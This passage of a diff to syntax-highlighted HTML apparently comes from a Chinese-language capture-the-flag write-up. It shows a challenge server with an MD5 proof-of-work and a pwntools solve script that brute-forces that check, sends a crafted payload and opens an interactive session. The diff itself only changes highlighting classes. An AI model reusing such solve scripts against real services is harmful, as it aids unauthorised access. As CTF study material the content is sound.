-		<span class="n">rand</span> <span class="o">=</span> <span class="n">fp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
+		<span class="n">rand</span> <span class="o">=</span> <span class="n">fp</span><span class="p">.</span><span class="n">read</span><span class="p">(</span><span class="mi">8</span><span class="p">)</span>
 
-	<span class="k">print</span> <span class="s">'challenge: 0x</span><span class="si">%</span><span class="s">s'</span> <span class="o">%</span> <span class="n">rand</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
-	<span class="n">res</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'Enter response: '</span><span class="p">)</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+	<span class="k">print</span> <span class="s">'challenge: 0x%s'</span> <span class="o">%</span> <span class="n">rand</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+	<span class="n">res</span> <span class="o">=</span> <span class="nb">raw_input</span><span class="p">(</span><span class="s">'Enter response: '</span><span class="p">).</span><span class="n">strip</span><span class="p">()</span>
 
-	<span class="k">if</span> <span class="ow">not</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span> <span class="n">rand</span> <span class="o">+</span> <span class="n">res</span> <span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'fffff'</span><span class="p">):</span>
+	<span class="k">if</span> <span class="ow">not</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span> <span class="n">rand</span> <span class="o">+</span> <span class="n">res</span> <span class="p">).</span><span class="n">hexdigest</span><span class="p">().</span><span class="n">startswith</span><span class="p">(</span><span class="s">'fffff'</span><span class="p">):</span>
 		<span class="k">print</span> <span class="s">'Challenge failed'</span>
 		<span class="nb">exit</span><span class="p">()</span>
 
@@ -926,16 +926,16 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 	<span class="k">def</span> <span class="nf">handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span> <span class="n">frame</span><span class="p">):</span>
 		<span class="k">print</span> <span class="s">'Timeout!'</span>
 		<span class="nb">exit</span><span class="p">()</span>
-	<span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">handler</span><span class="p">)</span>
-	<span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span> <span class="mi">30</span> <span class="p">)</span>
+	<span class="n">signal</span><span class="p">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="p">.</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">handler</span><span class="p">)</span>
+	<span class="n">signal</span><span class="p">.</span><span class="n">alarm</span><span class="p">(</span> <span class="mi">30</span> <span class="p">)</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
-	<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="s">'w'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
-	<span class="n">sys</span><span class="o">.</span><span class="n">stdin</span>  <span class="o">=</span> <span class="n">os</span><span class="o">.</span><span class="n">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="s">'r'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="n">sys</span><span class="p">.</span><span class="n">stdout</span> <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdout</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="s">'w'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+	<span class="n">sys</span><span class="p">.</span><span class="n">stdin</span>  <span class="o">=</span> <span class="n">os</span><span class="p">.</span><span class="n">fdopen</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">stdin</span><span class="p">.</span><span class="n">fileno</span><span class="p">(),</span> <span class="s">'r'</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
 
 
 
-	<span class="n">sys</span><span class="o">.</span><span class="n">dont_write_bytecode</span> <span class="o">=</span> <span class="bp">True</span>
+	<span class="n">sys</span><span class="p">.</span><span class="n">dont_write_bytecode</span> <span class="o">=</span> <span class="bp">True</span>
 	<span class="kn">from</span> <span class="nn">conf</span> <span class="kn">import</span> <span class="n">KEY</span><span class="p">,</span> <span class="n">FLAG</span><span class="p">,</span> <span class="n">MONEY</span>
 
 
@@ -1006,17 +1006,17 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 <span class="n">all_str</span> <span class="o">=</span> <span class="p">[</span><span class="nb">chr</span><span class="p">(</span><span class="n">c</span><span class="p">)</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">256</span><span class="p">)]</span>
 
 <span class="k">def</span> <span class="nf">myexec</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
-	<span class="k">return</span> <span class="n">subprocess</span><span class="o">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+	<span class="k">return</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">check_output</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
 
 <span class="k">def</span> <span class="nf">pass_challenge</span><span class="p">(</span><span class="n">seed</span><span class="p">):</span>
-	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"seed: "</span> <span class="o">+</span> <span class="n">seed</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">))</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"seed: "</span> <span class="o">+</span> <span class="n">seed</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">))</span>
 	<span class="k">for</span> <span class="n">cnt</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">6</span><span class="p">):</span>
-		<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">itertools</span><span class="o">.</span><span class="n">product</span><span class="p">(</span><span class="n">all_str</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">cnt</span><span class="p">):</span>
-			<span class="n">resp</span> <span class="o">=</span> <span class="s">''</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
+		<span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">itertools</span><span class="p">.</span><span class="n">product</span><span class="p">(</span><span class="n">all_str</span><span class="p">,</span> <span class="n">repeat</span><span class="o">=</span><span class="n">cnt</span><span class="p">):</span>
+			<span class="n">resp</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">c</span><span class="p">)</span>
 			<span class="n">test</span> <span class="o">=</span> <span class="n">seed</span> <span class="o">+</span> <span class="n">resp</span>
-			<span class="k">if</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span> <span class="n">test</span> <span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span><span class="o">.</span><span class="n">startswith</span><span class="p">(</span><span class="s">'fffff'</span><span class="p">):</span>
-				<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"found: "</span> <span class="o">+</span> <span class="n">resp</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">))</span>
-				<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"verify: "</span> <span class="o">+</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">test</span><span class="p">)</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">())</span>
+			<span class="k">if</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span> <span class="n">test</span> <span class="p">).</span><span class="n">hexdigest</span><span class="p">().</span><span class="n">startswith</span><span class="p">(</span><span class="s">'fffff'</span><span class="p">):</span>
+				<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"found: "</span> <span class="o">+</span> <span class="n">resp</span><span class="p">.</span><span class="n">encode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">))</span>
+				<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"verify: "</span> <span class="o">+</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">md5</span><span class="p">(</span><span class="n">test</span><span class="p">).</span><span class="n">hexdigest</span><span class="p">())</span>
 				<span class="k">return</span> <span class="n">resp</span>
 
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
@@ -1027,19 +1027,19 @@ openssl 指令下一下之後就可以解出 flag 了</p>
 
 	<span class="n">final_payload</span> <span class="o">=</span> <span class="n">payload</span> <span class="o">+</span> <span class="s">"-----571297fb4b5b065155bc5a3faa2a9a3d"</span>
 
-	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"challenge: 0x"</span><span class="p">)</span>
-	<span class="n">seed</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter response: "</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"challenge: 0x"</span><span class="p">)</span>
+	<span class="n">seed</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">16</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="s">'hex'</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Enter response: "</span><span class="p">)</span>
 	<span class="n">resp</span> <span class="o">=</span> <span class="n">pass_challenge</span><span class="p">(</span><span class="n">seed</span><span class="p">)</span>
-	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending resp:"</span> <span class="o">+</span> <span class="n">resp</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending resp:"</span> <span class="o">+</span> <span class="n">resp</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">resp</span><span class="p">)</span>
 
-	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input your choice: "</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"information: "</span><span class="p">)</span>
-	<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload:"</span> <span class="o">+</span> <span class="n">final_payload</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">final_payload</span><span class="p">)</span>
-	<span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Input your choice: "</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"2"</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"information: "</span><span class="p">)</span>
+	<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"sending payload:"</span> <span class="o">+</span> <span class="n">final_payload</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">final_payload</span><span class="p">)</span>
+	<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
